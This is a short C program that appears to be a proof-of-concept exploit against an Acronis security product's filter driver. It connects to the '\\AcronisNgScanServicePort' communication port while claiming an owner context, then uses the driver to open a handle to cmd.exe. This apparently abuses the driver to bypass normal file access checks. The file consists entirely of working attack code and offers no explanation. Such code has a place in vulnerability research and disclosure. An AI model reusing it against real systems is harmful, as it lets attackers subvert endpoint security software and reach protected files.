#include <Windows.h>

#include <Fltuser.h>
#pragma comment(lib, "FltLib")

#include <stdio.h>
#include "Acronis-Common.h"

int main() {
	HRESULT hResult = 0;
	HANDLE hFile = 0;
	HANDLE hPort = 0;
	HANDLE hHeap = GetProcessHeap();
	DWORD dwBytesReturned = 0;
	BOOL bRes = FALSE;

	ACRONIS_FLT_CTX aCtx = { 0 };
	PACRONIS_FLT_MESSAGE pAcronisMessage = (PACRONIS_FLT_MESSAGE)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(ACRONIS_FLT_MESSAGE));
	LPVOID lpOutBuf = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x1000);
	const wchar_t* strSrcFile = LR"(\??\C:\Windows\System32\cmd.exe)";

	if (!pAcronisMessage) {
		GLE("HeapAlloc - AcronisMessage");
		return -1;
	}

	aCtx.dwContextSwitch = ACRONIS_CTX_OWNER;

	hResult = FilterConnectCommunicationPort(
		L"\\AcronisNgScanServicePort",
		0,
		&aCtx,
		sizeof(aCtx),
		NULL,
		&hPort
	);

	if (FAILED(hResult)) {
		GLE("FilterConnectCommunicationPort");
		printf("\tFLT Status: %lx\n", hResult);
		CloseHandle(hPort);
		return -1;
	}

	puts("Connected to FLT Comm Port, attempting to open file.");
	bRes = OpenFile_Acronis(hPort, strSrcFile, &hFile);

	if (!bRes) {
		GLE("Failed to open file!");
		return -1;
	}

	printf("Successfully opened handle to file - 0x%p\nPress any key to continue...", hFile);
	getchar();
	CloseHandle(hPort);
	CloseHandle(hFile);	
	return 0;

}

